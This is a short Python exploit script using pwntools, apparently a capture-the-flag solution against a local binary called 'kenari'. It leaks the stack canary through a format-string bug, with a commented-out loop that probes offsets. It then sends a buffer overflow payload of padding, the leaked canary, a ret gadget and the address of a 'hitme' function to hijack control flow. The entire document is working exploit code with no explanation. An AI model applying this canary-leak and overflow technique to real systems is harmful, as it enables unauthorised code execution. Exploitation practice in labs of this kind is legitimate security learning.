from pwn import *

elf = context.binary = ELF('../src/kenari')
rop = ROP(elf)
# elf = context.binary = ELF('../server/files/kenari')
context.log_level = 'critical'

io = process(elf.path)
io = remote('localhost', 11001)

# # #========= LEAK CANARY =========
# for i in range(100): 
#     io = process(elf.path)
#     # io = remote('localhost', 11001)
    
#     payload = f'%{i}$p'
#     payload = payload.encode()
#     io.sendlineafter(b'username: ', payload)
#     print(f'ke-{i}', io.recvline())
#     io.close()


io.sendlineafter(b'username: ', b'%15$p')
# print(io.recvline())
canary = int(io.recvline().strip(), 16)
print(hex(canary))

# find ret address
ret_addr = rop.find_gadget(['ret'])[0]

payload = b'A'* 72 + p64(canary) + b'A'*8 + p64(ret_addr) + p64(elf.sym.hitme)
io.sendlineafter(b'password: ', payload)


print(io.recvall().decode())

